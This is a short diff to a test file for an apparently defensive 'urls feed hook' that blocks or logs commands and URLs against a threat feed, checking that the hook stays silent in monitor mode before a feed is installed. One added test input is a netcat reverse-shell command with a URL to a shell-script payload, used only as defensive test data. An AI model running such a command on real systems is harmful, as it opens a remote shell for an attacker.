@@ -80,6 +80,9 @@ describe("urls feed hook", () => {
     expect(blocked.reason).not.toContain("http://evil-domain.example");
     expect(stats.blocked.feed).toBe(1);
     expect((await harness("off")).registered).toBe(false);
-    expect((await harness("monitor", false)).registered).toBe(false);
+    const absent = await harness("monitor", false); // registered, but silent until the feed is installed (live reload)
+    expect(absent.registered).toBe(true);
+    expect(await absent.fire("nc -e /bin/sh 10.0.0.1 4444 http://203.0.113.9:8080/bin.sh")).toBeUndefined();
+    expect(absent.logged).toHaveLength(0);
   });
 });
